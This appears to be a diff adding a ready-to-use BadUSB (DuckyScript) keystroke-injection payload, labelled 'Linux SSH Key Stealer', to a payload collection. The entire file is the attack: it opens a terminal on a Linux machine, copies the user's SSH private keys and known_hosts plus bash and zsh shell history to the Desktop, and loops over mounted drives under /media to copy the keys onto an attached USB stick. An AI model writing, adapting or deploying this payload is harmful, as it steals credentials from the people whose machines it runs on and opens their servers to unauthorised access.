@@ -1,0 +1,32 @@
+REM Title: Linux SSH Key Stealer
+REM Author: BadUSB Library
+REM Description: Steals SSH private keys and known_hosts
+REM Target: Linux
+REM Category: Authentication
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Steal SSH keys
+STRING cp -r ~/.ssh ~/Desktop/ssh_keys_backup
+ENTER
+DELAY 2000
+
+STRING cp ~/.bash_history ~/Desktop/bash_history_backup
+ENTER
+DELAY 2000
+
+STRING cp ~/.zsh_history ~/Desktop/zsh_history_backup
+ENTER
+DELAY 2000
+
+REM Also copy to USB if available
+STRING for drive in /media/*; do if [ -d "$drive" ]; then cp -r ~/.ssh "$drive/ssh_keys_$(date +%Y%m%d)"; fi; done
+ENTER
+DELAY 3000
